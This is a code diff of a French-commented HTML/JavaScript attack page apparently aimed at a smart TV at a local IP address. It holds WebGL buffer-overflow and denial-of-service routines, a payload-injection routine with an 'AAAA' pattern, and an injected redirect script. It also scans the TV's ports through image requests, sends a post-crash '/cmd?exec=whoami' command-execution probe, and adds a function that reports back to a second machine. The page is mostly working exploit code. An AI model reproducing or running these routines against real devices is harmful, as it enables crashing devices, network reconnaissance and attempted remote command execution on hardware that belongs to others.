@@ -8,7 +8,7 @@
         button { margin: 5px; padding: 10px; cursor: pointer; }
         button.normal { background-color: #4CAF50; color: white; } /* Tests originaux */
         button.red { background-color: #f44336; color: white; } /* Tests DoS */
-        button.purple { background-color: #9C27B0; color: white; } /* Nouveaux exploits escalade */
+        button.purple { background-color: #9C27B0; color: white; } /* Exploits escalade */
         #status { color: black; }
     </style>
 </head>
@@ -35,12 +35,13 @@
     <button class="red" onclick="startBigDoS()">Lancer DoS WebGL Gros Buffer</button>
     <button class="red" onclick="startTextureDoS()">Lancer DoS WebGL + Texture</button>
 
-    <!-- Nouveaux exploits escalade (boutons violets) -->
+    <!-- Exploits escalade (boutons violets) -->
     <button class="purple" onclick="testPreciseOverflow()">Test Overflow Précis</button>
     <button class="purple" onclick="testInjectPayload()">Test Injection Payload</button>
     <button class="purple" onclick="testWebGLXSSComboEscalade()">Test WebGL + XSS Escalade</button>
     <button class="purple" onclick="testPortsPostCrash()">Test Ports Post-Crash</button>
     <button class="purple" onclick="startComplexDoS()">Lancer DoS Complexe</button>
+    <button class="purple" onclick="logToPC()">Log to PC</button>
 
     <script>
         function updateStatus(message) {
@@ -107,7 +108,7 @@
         function testPortScan() {
             try {
                 var ports = [80, 443, 8080, 1935, 554, 5000, 3000];
-                var ip = '<IP_de_la_TV>'; // Remplace par l'IP réelle
+                var ip = '192.168.1.92'; // IP de la TV
                 var results = [];
                 ports.forEach(port => {
                     var img = new Image();
@@ -310,12 +311,12 @@
                 if (gl) {
                     var buffer = gl.createBuffer();
                     gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    var sizes = [9000000, 9500000, 10000000, 10500000];
+                    var sizes = [9400000, 9600000, 9800000, 10000000]; // Tailles affinées
                     for (var size of sizes) {
                         var data = new Float32Array(size);
                         gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
                     }
-                    updateStatus('Overflow précis tenté (crash à une taille spécifique)');
+                    updateStatus('Overflow précis tenté (crash à une taille)');
                 } else {
                     updateStatus('Erreur WebGL');
                 }
@@ -334,7 +335,7 @@
                     gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                     var payload = new Float32Array(10000000);
                     for (var i = 0; i < payload.length; i++) {
-                        payload[i] = 0x41414141; // Motif 'AAAA'
+                        payload[i] = 0x41414141 + (i % 0x100); // Motif dynamique
                     }
                     gl.bufferData(gl.ARRAY_BUFFER, payload, gl.STATIC_DRAW);
                     updateStatus('Payload injecté, crash si exécution');
@@ -357,7 +358,7 @@
                     var data = new Float32Array(10000000);
                     gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
                     var script = document.createElement('script');
-                    script.text = 'document.body.style.backgroundColor="orange"; if (window.someFlag) window.location="http://<IP_de_la_TV>:80/"';
+                    script.text = 'document.body.style.backgroundColor="orange"; window.location="http://192.168.1.92:80/"';
                     document.body.appendChild(script);
                     updateStatus('WebGL+XSS tenté (orange + redirection si vulnérable)');
                 } else {
@@ -372,14 +373,14 @@
         function testPortsPostCrash() {
             try {
                 var ports = [80, 443, 8080, 1935, 554, 5000, 3000];
-                var ip = '<IP_de_la_TV>'; // Remplace par l'IP réelle
+                var ip = '192.168.1.92'; // IP de la TV
                 var postCrashResults = [];
                 ports.forEach(port => {
                     var img = new Image();
                     img.onload = () => {
                         postCrashResults.push(`Port ${port}: Réponse post-crash`);
                         var cmdImg = new Image();
-                        cmdImg.src = `http://${ip}:${port}/cmd?exec=echo`;
+                        cmdImg.src = `http://${ip}:${port}/cmd?exec=whoami`;
                     };
                     img.onerror = () => postCrashResults.push(`Port ${port}: Pas de réponse`);
                     img.src = `http://${ip}:${port}/postcrash`;
@@ -411,6 +412,18 @@
                     updateStatus('DoS complexe terminé, escalade possible');
                 }
             }, 100);
+        }
+
+        // Log to PC
+        function logToPC() {
+            try {
+                var ipPC = '192.168.1.91'; // Remplace par l'IP de ton PC
+                var img = new Image();
+                img.src = `http://${ipPC}:8080/log?data=Test`;
+                updateStatus('Log envoyé au PC');
+            } catch (e) {
+                updateStatus('Erreur log PC');
+            }
         }
     </script>
 </body>
